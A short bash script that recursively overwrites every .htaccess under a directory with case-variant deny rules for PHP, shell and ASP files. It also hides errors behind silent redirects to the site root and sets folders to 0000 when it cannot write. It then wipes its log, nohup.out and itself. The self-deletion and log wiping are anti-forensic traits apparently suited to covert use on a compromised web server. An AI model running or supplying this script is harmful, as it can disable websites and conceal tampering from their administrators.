#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH=$(readlink -f "$0")  # Get the absolute path of the script
NOHUP_FILE="$(dirname "$0")/nohup.out"  # Assume nohup.out is in the same directory as the script

update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi
  
HTACCESS_CONTENT=$(cat <<EOF
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.SH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.AS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.As*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.aS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.as*>
    Order Deny,Allow
    Deny from all
</Files>

Options -Indexes
ErrorDocument 403 "<meta http-equiv='refresh' content='0;url=/'>"
ErrorDocument 404 "<meta http-equiv='refresh' content='0;url=/'>"

EOF
)
  echo "$HTACCESS_CONTENT" > "$htaccess_file" || {
    local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
    echo "$msg" >> "$LOG_FILE"

    if ! chmod 0000 "$dir"; then
      local chmod_msg="$(date) - Failed to set permissions for folder $dir"
      echo "$chmod_msg" >> "$LOG_FILE"
    fi

    return
  }

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi
}

export -f update_htaccess
find "$TARGET_DIR" -type d -exec bash -c 'update_htaccess "$0"' {} \;
sleep 5

# Remove log file
rm -f "$LOG_FILE"

# Remove nohup.out if it exists
if [ -f "$NOHUP_FILE" ]; then
  rm -f "$NOHUP_FILE"
fi

# Self-delete the script
rm -f "$SCRIPT_PATH"